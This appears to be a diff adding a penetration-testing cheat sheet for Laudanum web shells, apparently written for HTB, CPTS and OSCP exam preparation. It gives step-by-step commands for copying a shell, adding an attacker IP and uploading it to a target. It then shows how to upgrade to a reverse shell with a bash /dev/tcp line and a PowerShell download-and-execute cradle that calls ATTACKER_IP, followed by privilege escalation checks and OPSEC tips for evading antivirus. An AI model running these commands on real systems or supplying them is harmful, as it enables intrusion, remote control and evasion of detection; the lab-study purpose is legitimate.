@@ -326,3 +326,237 @@ bash -i >& /dev/tcp/IP/4444 0>&1
 
 ---
 
+# 🐚 Laudanum Web Shell Cheat Sheet (HTB / CPTS / OSCP)
+
+---
+
+# 📁 Laudanum Location
+
+|Action|Command|
+|---|---|
+|Locate Laudanum|`bash ls /usr/share/laudanum`|
+|View ASPX shells|`bash ls /usr/share/laudanum/aspx`|
+|View PHP shells|`bash ls /usr/share/laudanum/php`|
+|View all shells|`bash find /usr/share/laudanum -type f`|
+
+---
+
+# 📋 Copy Shell for Use
+
+|Task|Command|
+|---|---|
+|Copy ASPX shell|`bash cp /usr/share/laudanum/aspx/shell.aspx .`|
+|Copy PHP shell|`bash cp /usr/share/laudanum/php/shell.php .`|
+|Copy JSP shell|`bash cp /usr/share/laudanum/jsp/shell.jsp .`|
+
+Example:
+
+```bash
+cp /usr/share/laudanum/aspx/shell.aspx demo.aspx
+```
+
+---
+
+# ✏️ Edit Shell (VERY IMPORTANT)
+
+|Task|Command|
+|---|---|
+|Edit shell|`bash nano demo.aspx`|
+
+Find allowedIps:
+
+```csharp
+string[] allowedIps = { "127.0.0.1", "10.10.14.12" };
+```
+
+Add attacker IP:
+
+```csharp
+string[] allowedIps = { "127.0.0.1", "10.10.14.12", "ATTACKER_IP" };
+```
+
+---
+
+# 📤 Upload Shell
+
+Upload via:
+
+|Method|Example|
+|---|---|
+|File upload form|demo.aspx|
+|FTP|upload demo.aspx|
+|SMB share|copy demo.aspx|
+|WebDAV|upload shell|
+
+---
+
+# 🌐 Access Web Shell
+
+|Format|Example|
+|---|---|
+|Standard|`http://target/files/demo.aspx`|
+|PHP shell|`http://target/uploads/shell.php`|
+|JSP shell|`http://target/shell.jsp`|
+
+---
+
+# ⚡ Execute Commands
+
+|Command|Purpose|
+|---|---|
+|whoami|Current user|
+|hostname|Machine name|
+|systeminfo|Windows system info|
+|ipconfig|Network info|
+|dir|List files|
+|pwd|Current directory|
+
+Example:
+
+```cmd
+systeminfo
+```
+
+```cmd
+whoami
+```
+
+---
+
+# 📡 Upgrade to Reverse Shell
+
+## Start listener
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## Linux Reverse Shell
+
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+```
+
+---
+
+## Windows Reverse Shell
+
+```powershell
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
+```
+
+---
+
+# 🧰 Spawn Interactive Shell
+
+|Method|Command|
+|---|---|
+|Python|`bash python3 -c 'import pty; pty.spawn("/bin/bash")'`|
+|Bash|`bash /bin/bash -i`|
+
+Fix shell:
+
+```bash
+export TERM=xterm
+```
+
+```bash
+stty rows 40 columns 100
+```
+
+---
+
+# 🔎 Find Uploaded Shell Location
+
+|Command|Purpose|
+|---|---|
+|List webroot|`bash ls /var/www/html`|
+|Find shell|`bash find / -name "*.php" 2>/dev/null`|
+
+---
+
+# 📂 Common Webroot Locations
+
+|Server|Location|
+|---|---|
+|Apache|/var/www/html|
+|Nginx|/usr/share/nginx/html|
+|IIS|C:\inetpub\wwwroot|
+|Tomcat|/opt/tomcat/webapps|
+
+---
+
+# 🔥 Privilege Escalation Checks
+
+|Command|Purpose|
+|---|---|
+|Check user|`bash whoami`|
+|Check privileges|`bash sudo -l`|
+|Check system|`bash uname -a`|
+|Check users|`bash cat /etc/passwd`|
+
+---
+
+# 🎯 Full Attack Workflow
+
+|Step|Action|
+|---|---|
+|1|Find upload vulnerability|
+|2|Copy Laudanum shell|
+|3|Edit attacker IP|
+|4|Upload shell|
+|5|Access shell in browser|
+|6|Execute commands|
+|7|Upgrade to reverse shell|
+|8|Spawn interactive shell|
+|9|Privilege escalation|
+
+---
+
+# 🧠 Most Used Laudanum Shell Files
+
+|Language|File|
+|---|---|
+|PHP|shell.php|
+|ASPX|shell.aspx|
+|JSP|shell.jsp|
+|ASP|shell.asp|
+
+---
+
+# 🏆 Most Important Commands (Memorize)
+
+```bash
+cp /usr/share/laudanum/php/shell.php .
+```
+
+```bash
+nc -lvnp 4444
+```
+
+```bash
+bash -i >& /dev/tcp/IP/4444 0>&1
+```
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```bash
+sudo -l
+```
+
+---
+
+# ⚠️ OPSEC Tips
+
+|Tip|Reason|
+|---|---|
+|Remove comments|Avoid detection|
+|Rename file|Avoid signature detection|
+|Obfuscate code|Avoid AV|
+|Use reverse shell|More stable|
+
+---
